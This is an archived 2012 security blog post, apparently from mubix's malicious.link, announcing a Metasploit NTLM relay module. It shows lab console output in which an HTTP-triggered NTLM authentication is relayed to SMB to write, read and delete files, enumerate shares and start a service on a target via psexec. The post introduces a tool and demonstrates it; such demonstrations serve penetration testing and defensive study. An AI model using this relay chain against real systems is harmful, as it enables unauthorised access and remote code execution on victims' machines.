@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cross-Protocol Chained Pass the Hash for Metasploit - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Cross-Protocol Chained Pass the Hash for Metasploit" />
+<meta property="og:description" content="Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
+Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
+Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
+Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170
+You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
+And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2012-07-10T06:02:40+00:00" />
+<meta property="article:modified_time" content="2012-07-10T06:02:40+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cross-Protocol Chained Pass the Hash for Metasploit"/>
+<meta name="twitter:description" content="Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
+Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
+Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
+Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170
+You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
+And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):"/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" /><link rel="prev" href="https://malicious.link/posts/2012/2012-07-05-bypassing-trend-micros-service-protection/" /><link rel="next" href="https://malicious.link/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cross-Protocol Chained Pass the Hash for Metasploit",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2012\/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit\/"
+        },"genre": "posts","wordcount":  483 ,
+        "url": "https:\/\/malicious.link\/posts\/2012\/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit\/","datePublished": "2012-07-10T06:02:40+00:00","dateModified": "2012-07-10T06:02:40+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cross-Protocol Chained Pass the Hash for Metasploit</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/metasploit/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>metasploit</a>&nbsp;<a href="/categories/pth/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>pth</a>&nbsp;<a href="/categories/smbrelay/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>smbrelay</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2012-07-10">2012-07-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;483 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/postimages/201207_pth_1.png"
+        data-srcset="/images/postimages/201207_pth_1.png, /images/postimages/201207_pth_1.png 1.5x, /images/postimages/201207_pth_1.png 2x"
+        data-sizes="auto"
+        alt="/images/postimages/201207_pth_1.png"
+        title="/images/postimages/201207_pth_1.png" /></p>
+<p>Twitter Link: <a href="https://twitter.com/webstersprodigy/status/222529916783169536" target="_blank" rel="noopener noreffer ">https://twitter.com/webstersprodigy/status/222529916783169536</a></p>
+<p>Which has a link to here: <a href="https://github.com/rapid7/metasploit-framework/pull/589" target="_blank" rel="noopener noreffer ">https://github.com/rapid7/metasploit-framework/pull/589</a></p>
+<p>Demo / Example resource files: <a href="https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170" target="_blank" rel="noopener noreffer ">https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170</a></p>
+<p>You can pull the fork w/ branch from here: <a href="https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay" target="_blank" rel="noopener noreffer ">https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay</a></p>
+<p>And as soon as you do you can start doing this (<strong><em>using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded</em></strong>):</p>
+<p>163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&rsquo;t tested this out yet.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt written
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - ----Contents----
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - hi ima secret
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - ----End Contents----
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ ADMIN$ C$
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - .rnd
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - PerfLogs
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - config.sys
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - inetpub
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - xampp
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - ProgramData
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - MSOCache
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - secret.txt
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - autoexec.bat
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Windows
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Users
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Program Files
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - File \\172.16.10.182\c$\secret.txt deleted
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Creating a new service
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Closing service handle...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Opening service...
+</span></span><span class="line"><span class="cl">[*] 172.16.10.163 http_ntlmrelay - Starting the service...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let the fun begin&hellip;</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2012-07-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" data-title="Cross-Protocol Chained Pass the Hash for Metasploit" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" data-title="Cross-Protocol Chained Pass the Hash for Metasploit"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" data-title="Cross-Protocol Chained Pass the Hash for Metasploit"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" data-title="Cross-Protocol Chained Pass the Hash for Metasploit"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/" data-title="Cross-Protocol Chained Pass the Hash for Metasploit"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2012/2012-07-05-bypassing-trend-micros-service-protection/" class="prev" rel="prev" title="Bypassing Trend Micro&#39;s Service Protection"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Bypassing Trend Micro's Service Protection</a>
+            <a href="/posts/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/" class="next" rel="next" title="Raising Zombies in Windows: Part 1 - Passwords">Raising Zombies in Windows: Part 1 - Passwords<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
